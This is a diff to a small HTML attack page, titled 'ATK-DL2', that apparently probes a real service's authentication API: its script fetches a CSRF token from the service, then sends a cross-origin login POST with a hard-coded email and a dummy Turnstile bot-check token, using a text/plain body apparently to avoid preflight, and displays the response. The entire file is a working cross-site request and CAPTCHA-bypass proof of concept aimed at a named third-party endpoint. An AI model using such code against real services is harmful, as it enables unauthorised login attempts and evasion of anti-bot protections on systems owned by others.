@@ -1,17 +1,24 @@
 <!DOCTYPE html>
-<html><head><meta charset="utf-8"><title>ATK-DL</title></head>
-<body><pre id="out">DL-START</pre>
+<html><head><meta charset="utf-8"><title>ATK-DL2</title></head>
+<body><pre id="out">DL2-START</pre>
 <script>
 try {
+  // Сначала получим свежий CSRF
+  var xhr0 = new XMLHttpRequest();
+  xhr0.open("GET", "https://dashboard-api.swapped.com/api/v1/auth/csrf", false);
+  xhr0.send();
+  var csrf = JSON.parse(xhr0.responseText).data.csrf_token;
+
+  // Теперь POST login с dummy Turnstile
   var xhr = new XMLHttpRequest();
   xhr.open("POST", "https://dashboard-api.swapped.com/api/v1/auth/login", false);
   xhr.setRequestHeader("Content-Type", "text/plain");
-  xhr.setRequestHeader("X-CSRF-Token", "");
+  xhr.setRequestHeader("X-CSRF-Token", csrf);
   xhr.send(JSON.stringify({ email: "platostri@proton.me", turnstile_token: "XXXX.DUMMY.TOKEN.XXXX" }));
-  document.title = "DL-" + xhr.status;
-  document.getElementById("out").textContent = "DL-RESULT " + xhr.status + " :: " + xhr.responseText.slice(0, 500);
+  document.title = "DL2-" + xhr.status;
+  document.getElementById("out").textContent = "DL2-RESULT " + xhr.status + " :: CSRF=" + csrf.slice(0,10) + " :: " + xhr.responseText.slice(0, 500);
 } catch (e) {
-  document.title = "DL-ERR";
-  document.getElementById("out").textContent = "DL-ERR " + e.message;
+  document.title = "DL2-ERR";
+  document.getElementById("out").textContent = "DL2-ERR " + e.message;
 }
 </script></body></html>
